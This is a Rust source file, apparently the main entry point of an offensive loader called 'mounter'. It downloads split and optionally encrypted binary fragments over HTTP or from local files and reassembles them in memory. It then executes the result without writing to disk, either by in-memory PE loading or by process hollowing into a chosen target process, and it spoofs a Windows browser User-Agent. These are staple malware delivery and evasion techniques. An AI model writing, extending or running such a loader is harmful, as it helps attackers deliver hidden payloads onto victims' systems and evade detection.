//! Download, reconstruct, and execute split binaries in memory

use anyhow::{Context, Result};
use clap::Parser;
use mounterlib::{download, execution, reconstruct};
#[derive(Parser, Debug)]
#[command(
    name = "mounter",
    author = "M3str3 <namestre3@protonmail.com>",
    version = "0.1.0",
    about = "Download, reconstruct, and execute split binaries in memory"
)]
struct Args {
    #[arg(
        short = 'u',
        long = "urls",
        value_delimiter = ',',
        required = true,
        help = "URLs or local file paths of split parts (auto-detects HTTP/local)"
    )]
    urls: Vec<String>,

    #[arg(
        short = 'v',
        long = "verbose",
        help = "Show detailed progress information"
    )]
    verbose: bool,

    #[arg(long = "dry-run", help = "Validate parts without executing")]
    dry_run: bool,

    #[arg(
        short = 't',
        long = "timeout",
        default_value = "30",
        help = "HTTP request timeout in seconds"
    )]
    timeout: u64,

    #[arg(long = "no-validate", help = "Skip final checksum validation")]
    no_validate: bool,

    #[arg(
        long = "user-agent",
        default_value = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        help = "User-Agent string for HTTP requests"
    )]
    user_agent: String,

    #[arg(
        short = 'm',
        long = "method",
        default_value = "local-pe",
        help = "Execution method: local-pe, process-hollowing"
    )]
    method: String,

    #[arg(
        long = "target",
        help = "Target process path (required for process-hollowing method)"
    )]
    target_process: Option<String>,

    #[arg(long = "password", help = "Password for encrypted fragments")]
    password: Option<String>,
}

fn main() {
    let all_args: Vec<String> = std::env::args().collect();
    let separator_pos = all_args.iter().position(|arg| arg == "--");
    
    let (mounter_args, exec_args) = if let Some(pos) = separator_pos {
        let mounter = all_args[..pos].to_vec();
        let exec = all_args[pos + 1..].to_vec();
        (mounter, exec)
    } else {
        (all_args, Vec::new())
    };
    
    let args = Args::parse_from(mounter_args);

    if let Err(e) = run(args, exec_args) {
        eprintln!("[-] Error: {}", e);
        let mut source = e.source();
        while let Some(cause) = source {
            eprintln!("    Caused by: {}", cause);
            source = cause.source();
        }
        std::process::exit(1);
    }
}

fn run(args: Args, exec_args: Vec<String>) -> Result<()> {
    if args.urls.is_empty() {
        anyhow::bail!("At least one URL must be provided");
    }

    let is_local = args
        .urls
        .iter()
        .all(|url| !url.starts_with("http://") && !url.starts_with("https://"));

    if args.verbose {
        println!("[*] Mounter v0.1.0");
        if is_local {
            println!("[*] Loading {} parts from local files...", args.urls.len());
        } else {
            println!("[*] Downloading {} parts...", args.urls.len());
        }
    }

    let parts = download_all_parts(&args)?;

    if args.verbose {
        if is_local {
            println!("[+] Loaded {} parts successfully", parts.len());
        } else {
            println!("[+] Downloaded {} parts successfully", parts.len());
        }
    }

    if args.verbose {
        println!("[*] Reconstructing binary in memory...");
    }

    let validate_checksums = !args.no_validate;
    let binary = reconstruct::rebuild_from_parts(
        parts,
        args.password.as_deref(),
        validate_checksums,
        args.verbose,
    )
    .context("Failed to reconstruct binary")?;

    if args.verbose {
        println!(
            "[+] Binary reconstructed: {} bytes ({:.2} MB)",
            binary.len(),
            binary.len() as f64 / 1_048_576.0
        );
    }

    if args.dry_run {
        println!("[+] Dry-run completed. Binary validated successfully.");
        return Ok(());
    }

    if args.verbose {
        println!("[*] Executing binary in memory using: {}", args.method);
    }

    println!("{}", "=".repeat(60));
    println!("                    RUNNING                    ");
    println!("{}", "=".repeat(60));

    match args.method.as_str() {
        "local-pe" => {
            #[cfg(feature = "execution-local-pe")]
            {
                execution::local_pe::inject_and_execute(&binary, &exec_args, args.verbose)
                    .context("Failed to execute binary")?;
            }
            #[cfg(not(feature = "execution-local-pe"))]
            {
                anyhow::bail!(
                    "Local PE execution not available. Compile with --features execution-local-pe"
                );
            }
        }
        "process-hollowing" => {
            #[cfg(feature = "execution-process-hollowing")]
            {
                let target = args.target_process.as_ref().ok_or_else(|| {
                    anyhow::anyhow!("--target is required for process-hollowing method")
                })?;

                execution::execute_with_process_hollowing(&binary, target, args.verbose)
                    .context("Failed to execute binary with process hollowing")?;
            }
            #[cfg(not(feature = "execution-process-hollowing"))]
            {
                anyhow::bail!("Process hollowing not available. Compile with --features execution-process-hollowing");
            }
        }
        _ => {
            anyhow::bail!(
                "Unknown execution method: {}. Available: local-pe, process-hollowing",
                args.method
            );
        }
    }

    Ok(())
}

fn download_all_parts(
    args: &Args,
) -> Result<std::collections::HashMap<u32, (mainlib::PartHeader, Vec<u8>)>> {
    // Detect if URLs are local file paths or HTTP(S) URLs
    let is_local = args
        .urls
        .iter()
        .all(|url| !url.starts_with("http://") && !url.starts_with("https://"));

    if is_local {
        // Load from local filesystem
        #[cfg(feature = "download-local")]
        {
            use std::path::PathBuf;
            let paths: Vec<PathBuf> = args.urls.iter().map(PathBuf::from).collect();
            download::local::load_all_as_map(&paths, args.verbose)
                .context("Failed to load parts from local files")
        }
        #[cfg(not(feature = "download-local"))]
        {
            anyhow::bail!(
                "Local file loading not available. Compile with --features download-local"
            )
        }
    } else {
        // Download from HTTP(S)
        #[cfg(feature = "download-http")]
        {
            download::http::download_all_as_map(
                &args.urls,
                args.timeout,
                &args.user_agent,
                args.verbose,
            )
            .context("Failed to download parts")
        }
        #[cfg(not(feature = "download-http"))]
        {
            anyhow::bail!("HTTP download not available. Compile with --features download-http")
        }
    }
}
